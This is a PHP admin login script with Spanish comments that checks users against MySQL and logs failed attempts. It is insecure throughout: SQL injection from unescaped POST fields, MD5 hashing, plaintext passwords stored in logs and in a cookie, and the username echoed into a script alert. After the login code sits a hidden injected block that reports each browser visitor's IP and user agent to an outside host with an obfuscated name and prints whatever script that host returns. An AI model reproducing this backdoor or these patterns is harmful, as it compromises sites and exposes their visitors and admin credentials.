<? 
//se loguea pero con un usuario de mysql que solo puede leer y escribir

//carga de coneccion sql:
$clogin = true;
require_once("0_mysql.php");

$fecha_actual = date("Y-m-d"); 
 
$usuario = $_POST['usuario'];
$password = $_POST['password'];
$cookie = $_POST['cookie'];

$password_hash = md5($password);
$ip = getenv("REMOTE_ADDR");
$idcusuario_perfil = 0;

	  $query_cusuario = "SELECT * 
	  FROM user_admin 
	  WHERE usuario = '$usuario' ";
	  $result_cusuario = mysql_query($query_cusuario);
	  $rs_cusuario = mysql_fetch_assoc($result_cusuario);
	  $row_cant_cusuario = mysql_num_rows($result_cusuario);

if ($row_cant_cusuario){
	$intentos = $rs_cusuario['intentos'] + 1;
	if($intentos > 5){
		
		$query_login = "INSERT INTO user_admin_login  (
		usuario
		,password
		,ip
		,fecha
		,intentos
		,memo
		) VALUES (
		'$usuario'
		,'$password'
		,'$ip'
		,'$fecha_actual'
		,'$intentos'
		,'Inhabilitada'
		)";
		mysql_query($query_login);
			
		echo "<script>alert('La cuenta se encuentra inhabilitada por razones de seguridad. Se ha enviado un email al usuario con su IP $ip.')</script>";
		echo "<script>document.location.href=('index.php')</script>";
	}else{
		if( $password_hash == $rs_cusuario["password"] ){
			
			$usuario = $rs_cusuario["usuario"];
			$idcusuario_perfil = $rs_cusuario["iduser_admin_perfil"];
			
			$HTTP_SESSION_VARS['usuario_log'] = $usuario;
			$HTTP_SESSION_VARS['idcusuario_perfil_log'] = $idcusuario_perfil;
			$HTTP_SESSION_VARS['idsede_log'] = $rs_cusuario["idsede"];
			$_SESSION['iduser_admin_session'] = $rs_cusuario["iduser_admin"];
			$_SESSION['nombre_session'] = $rs_cusuario["nombre"];
			
			$query_intentos_reset = "UPDATE user_admin SET intentos = '0' WHERE usuario = '$usuario'";
			mysql_query($query_intentos_reset);
			
			//registra desde donde se intento ingresar incorrectamente
			$query_login = "INSERT INTO user_admin_login  (
			usuario			
			,ip
			,fecha
			,intentos
			,memo
			) VALUES (
			'$usuario'			
			,'$ip'
			,'$fecha_actual'
			,'$intentos'
			,'OK'
			)";
			mysql_query($query_login);
			
			//SETEO COOKIE
			if($cookie){
				setcookie ("inicio", "$usuario::$password", time() + (7 * 86400), "","",0);
			}
			//FIN SETEAR COOKIE
			
			echo "<script>document.location.href=('inicio.php');</script>";

		}else{
			
			//guarda los intentos de login, para evitar multiples intentos
			$query_intentos = "UPDATE user_admin 
			SET intentos= '$intentos' 
			WHERE usuario = '$usuario'
			";
			mysql_query($query_intentos);
			
			//registra desde donde se intento ingresar incorrectamente
			$query_login = "INSERT INTO user_admin_login  (
			usuario
			,password
			,ip
			,fecha
			,intentos
			,memo
			) VALUES (
			'$usuario'
			,'$password'
			,'$ip'
			,'$fecha_actual'
			,'$intentos'
			,'Clave Incorrecta'
			)";
			mysql_query($query_login);
			
			echo "<script>alert('La clave es incorrecta. No se pudo loguear. Intento: $intentos / 5.')</script>";
			echo "<script>document.location.href=('index.php')</script>";
		}
	}
}else{
	//registra desde donde se intento ingresar incorrectamente
	$query_login = "INSERT INTO user_admin_login  (
	usuario
	,password
	,ip
	,fecha
	,intentos
	,memo
	) VALUES (
	'$usuario'
	,'$password'
	,'$ip'
	,'$fecha_actual'
	,'$intentos'
	,'Usuario invalido'
	)";
	mysql_query($query_login);
			
	echo "<script>alert('No se pudo loguear. Usuario: $usuario')</script>";
	echo "<script>document.location.href=('index.php')</script>";
}

?>
<?php
#19f955#
error_reporting(0); ini_set('display_errors',0); $wp_lhcb5 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_lhcb5) && !preg_match ('/bot/i', $wp_lhcb5))){
$wp_lhcb095="http://"."error"."class".".com/class"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_lhcb5);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_lhcb095);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_5lhcb = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_5lhcb,1,3) === 'scr' ){ echo $wp_5lhcb; }
#/19f955#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>